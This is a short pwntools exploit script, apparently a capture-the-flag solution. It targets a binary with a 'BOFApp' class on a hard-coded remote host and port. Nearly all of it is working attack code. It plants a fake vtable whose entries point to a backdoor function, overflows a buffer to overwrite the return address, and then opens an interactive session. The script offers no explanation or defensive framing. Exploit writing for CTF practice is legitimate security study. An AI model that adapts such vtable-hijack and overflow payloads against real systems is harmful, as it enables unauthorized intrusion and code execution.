#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = ELF(elf.libc)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or '43.132.193.22'
	port = int(args.PORT or 9998)
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# tbreak main
# b BOFApp::launch()
b *0x40388C
b *0x4038B8
b raise
b *0x403626
b *0x40388c
b *0x4038b8
b backdoor
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn([], env=env)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr



sa(b'give me your canary', flat(
	0x4F4AA0+8, # pointer to BOFApp vtable (user_canary+8)
	0x403387, # destructor aka backdoor
	0x403387, # destructor aka backdoor
	0x403387, # destructor aka backdoor
).ljust(0x40, b'A'))

sla(b'pwn', flat(
	p64(0x4F4AA0+0x20) * (0x68//8), # some rw mem
	p64(0x403407), # (main+103)
	p64(0x4F4AA0) # user_canary,
))

ia()

